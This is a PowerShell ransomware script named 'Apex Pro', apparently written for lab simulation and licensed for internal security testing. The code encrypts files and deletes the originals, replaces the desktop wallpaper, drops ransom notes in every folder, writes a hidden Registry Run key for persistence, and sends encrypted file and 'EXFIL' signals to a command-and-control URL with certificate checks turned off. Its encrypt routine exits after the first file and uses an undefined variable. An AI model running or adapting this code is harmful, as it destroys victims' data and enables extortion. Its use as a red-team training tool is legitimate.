<#
Copyright (c) 2026 José María Micoli
Licensed under {'license_type': 'BSL', 'change_date': '2033-02-17', 'convert_to': 'Apache-2.0'}

You may:
✔ Study
✔ Modify
✔ Use for internal security testing

You may NOT:
✘ Offer as a commercial service
✘ Sell derived competing products
#>

<#
.SYNOPSIS
    Apex Pro v2.9 - Final Integrated Agent (Wallpaper, Notes, Exfil, Canary, and TLS Fix)
#>

param(
    [Parameter(Mandatory=$true)]
    [ValidateSet("Encrypt", "Decrypt")]
    $Mode,

    [Parameter(Mandatory=$false)]
    [string]$TargetPath = "C:\SimulationData",

    [Parameter(Mandatory=$false)]
    [string]$C2Url = "https://192.168.56.1:5000/api/v1/telemetry",

    [Parameter(Mandatory=$false)]
    [int]$Timer = 3600
)

# Force TLS 1.2 and Trust Self-Signed Certs (Required for your Custom C2)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

# Shared AES-256 Key (Must match SHARED_KEY in Python)
$Passphrase = "12345678901234567890123456789012"
$KeyBytes = [System.Text.Encoding]::UTF8.GetBytes($Passphrase)

# --- 1. WALLPAPER ENGINE ---
function Set-ApexWallpaper {
    $WP_Code = @'
    using System;
    using System.Runtime.InteropServices;
    public class Wallpaper {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    }
'@
    try {
        Add-Type -TypeDefinition $WP_Code -ErrorAction SilentlyContinue
        Add-Type -AssemblyName System.Drawing
        $Path = "$env:USERPROFILE\Pictures\apex_bg.bmp"
        $Bmp = New-Object System.Drawing.Bitmap(1920,1080)
        $G = [System.Drawing.Graphics]::FromImage($Bmp)
        $G.Clear([System.Drawing.Color]::DarkRed)
        $Font = New-Object System.Drawing.Font("Impact", 80)
        $G.DrawString("SYSTEM ENCRYPTED", $Font, [System.Drawing.Brushes]::White, 400, 400)
        $Bmp.Save($Path, [System.Drawing.Imaging.ImageFormat]::Bmp)
        [Wallpaper]::SystemParametersInfo(0x0014, 0, $Path, 0x01 -bor 0x02)
    } catch { Send-ApexSignal "ERROR" "Wallpaper Fail" $_.Exception.Message }
}

# --- 2. SIGNALING ENGINE ---
function Send-ApexSignal {
    param ($Prefix, $Data1, $Data2 = "")
    
    # 1. Prepare the Plaintext
    $FinalPayload = "$Prefix|$Data1|$Data2"
    
    # 2. Manual AES Encryption
    $Aes = [System.Security.Cryptography.Aes]::Create()
    $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $Aes.Key = $KeyBytes
    $Aes.GenerateIV()
    
    $Enc = $Aes.CreateEncryptor()
    $PayloadBytes = [System.Text.Encoding]::UTF8.GetBytes($FinalPayload)
    $Cipher = $Enc.TransformFinalBlock($PayloadBytes, 0, $PayloadBytes.Length)
    
    # 3. Combine IV (16 bytes) + Ciphertext
    $BinaryBlob = New-Object byte[] (16 + $Cipher.Length)
    [Array]::Copy($Aes.IV, 0, $BinaryBlob, 0, 16)
    [Array]::Copy($Cipher, 0, $BinaryBlob, 16, $Cipher.Length)
    
    try {
        # 4. Upload as Binary Data
        $WC = New-Object System.Net.WebClient
        $WC.Headers.Add("Content-Type", "application/octet-stream")
        $WC.UploadData($C2Url, "POST", $BinaryBlob) | Out-Null
    } catch {
        Write-Host "[!] Telemetry Error: $($_.Exception.Message)" -ForegroundColor Yellow
    }
}

# --- 3. CRYPTO ENGINE (WITH FEEDBACK) ---
function Invoke-ApexCipher {
    param ($Path, $Key, $Action)
    try {
        $Aes = [System.Security.Cryptography.Aes]::Create()
        $Aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $Aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $Aes.Key = $Key
        $FileName = Split-Path $Path -Leaf
        
        if ($Action -eq "Encrypt") {
            $Aes.GenerateIV()
            $In = [System.IO.File]::ReadAllBytes($Path)
            $Out = ($Aes.CreateEncryptor()).TransformFinalBlock($In, 0, $In.Length)
            [System.IO.File]::WriteAllBytes("$Path.locked", ($Aes.IV + $Out))
            Remove-Item $Path -Force
            Send-ApexSignal "ENC" $FileName "LOCKED"
            # After sending the final signal
            Send-ApexSignal "COMPLETE" "All Files" $TotalSize

            # Add this small sleep to let the SSL socket close properly
            Start-Sleep -Milliseconds 500
            Exit
        } 
        else {
            # --- DECRYPT FEEDBACK LOGIC ---
            Write-Host "[*] Restoring: $FileName..." -ForegroundColor Cyan
            
            $In = [System.IO.File]::ReadAllBytes($Path)
            $Aes.IV = $In[0..15]
            $Plain = ($Aes.CreateDecryptor()).TransformFinalBlock($In, 16, ($In.Length-16))
            
            $OriginalPath = $Path.Replace(".locked","")
            [System.IO.File]::WriteAllBytes($OriginalPath, $Plain)
            Remove-Item $Path -Force
            
            # Success feedback in console
            Write-Host "[+] Success: $FileName restored." -ForegroundColor Green
            Send-ApexSignal "ENC" $FileName "RESTORED"
        }
    } catch { 
        Write-Host "[!] Error processing $FileName : $($_.Exception.Message)" -ForegroundColor Red
        Send-ApexSignal "ERROR" "Cipher Failed" (Split-Path $Path -Leaf) 
    }
}

# --- 4. MAIN EXECUTION ---
if ($Mode -eq "Encrypt") {
    # Visuals
    Set-ApexWallpaper

    # Persistence
    $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $PayloadPath = "`"$PSCommandPath`" -Mode Encrypt"
    New-ItemProperty -Path $RunKey -Name "ApexUpdate" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $PayloadPath" -PropertyType String -Force | Out-Null
    Send-ApexSignal "PERSIST" "Registry RunKey" $RunKey

    # Target Discovery
    if (-not (Test-Path $TargetPath)) { New-Item -ItemType Directory -Path $TargetPath -Force | Out-Null }
    $Files = Get-ChildItem $TargetPath -Recurse -File | Where-Object {$_.Extension -ne ".locked" -and $_.Name -notlike "*RECOVER*"}
    $Dirs = Get-ChildItem $TargetPath -Recurse -Directory
    $Dirs += Get-Item $TargetPath

    # Drop Ransom Notes
    foreach ($D in $Dirs) {
        $Note = "<html><body style='background:black;color:red;text-align:center;'><h1>!!! DATA ENCRYPTED BY APEX PRO !!!</h1><p>Contact Admin to Recover.</p></body></html>"
        $Note | Out-File (Join-Path $D.FullName "RECOVER_FILES_NOW.html") -Force
    }

    # Process Files
    foreach ($F in $Files) {
        if ($F.Name -like "*canary*") { Send-ApexSignal "CANARY" $F.Name "Accessed" }
        if ($F.Name -like "*PASS*" -or $F.Name -like "*SECRET*") {
            Send-ApexSignal "EXFIL" $F.Name $F.Length
        }
        Invoke-ApexCipher -Path $F.FullName -Key $KeyBytes -Action "Encrypt"
    }

    # Countdown
    $End = (Get-Date).AddSeconds($Timer)
    while ((Get-Date) -lt $End) {
        $Remaining = ($End - (Get-Date)).ToString('hh\:mm\:ss')
        Write-Host "`r[!] DATA ENCRYPTED. TIME REMAINING: $Remaining " -NoNewline -ForegroundColor Red
        Start-Sleep 1
    }
    # Optional: Secure wipe of locked files after timer expires
    # Get-ChildItem $TargetPath -Filter "*.locked" | Remove-Item -Force
} 
else {
    # Decrypt Mode
    Get-ChildItem $TargetPath -Recurse -Filter "*.locked" | ForEach-Object { Invoke-ApexCipher -Path $_.FullName -Key $KeyBytes -Action "Decrypt" }
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ApexUpdate" -ErrorAction SilentlyContinue
}